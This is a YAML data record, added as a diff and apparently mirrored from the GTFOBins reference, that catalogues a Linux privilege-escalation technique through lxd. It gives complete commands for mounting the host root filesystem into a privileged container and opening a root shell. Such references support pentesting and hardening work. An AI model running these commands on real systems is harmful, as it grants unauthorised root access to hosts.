@@ -1,0 +1,138 @@
+id: gtfobins/lxd/shell/suid
+type: binary
+platform: linux
+name: lxd
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'lxc init ubuntu:16.04 x -c security.privileged=true
+
+    lxc config device add x x disk source=/ path=/mnt/ recursive=true
+
+    lxc start x
+
+    lxc exec x /bin/sh'
+  comment: The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.
+- template: 'lxc image import ./alpine*.tar.gz --alias x
+
+    lxc init x x -c security.privileged=true
+
+    lxc config device add x x disk source=/ path=/mnt/ recursive=true
+
+    lxc start x
+
+    lxc exec x /bin/sh'
+  comment: 'This requires steps to be run offline, then the resulting image must be uploaded to target.
+    Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):
+
+
+    ```
+
+    git clone https://github.com/saghul/lxd-alpine-builder
+
+    cd lxd-alpine-builder
+
+    sudo ./build-alpine -a i686
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/lxd/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        lxd:
+          functions:
+            shell:
+            - code: 'lxc init ubuntu:16.04 x -c security.privileged=true
+
+                lxc config device add x x disk source=/ path=/mnt/ recursive=true
+
+                lxc start x
+
+                lxc exec x /bin/sh'
+              comment: The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be
+                downloaded.
+              contexts:
+                sudo: null
+                suid: null
+            - code: 'lxc image import ./alpine*.tar.gz --alias x
+
+                lxc init x x -c security.privileged=true
+
+                lxc config device add x x disk source=/ path=/mnt/ recursive=true
+
+                lxc start x
+
+                lxc exec x /bin/sh'
+              comment: 'This requires steps to be run offline, then the resulting image must be uploaded
+                to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):
+
+
+                ```
+
+                git clone https://github.com/saghul/lxd-alpine-builder
+
+                cd lxd-alpine-builder
+
+                sudo ./build-alpine -a i686
+
+                ```'
+              contexts:
+                sudo: null
+                suid: null
+    upstream_url: https://gtfobins.github.io/gtfobins/lxd/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:45205e3238bab42a38e41ce6cce5f97fbe9ead1d7398b232acb60a02d777b233
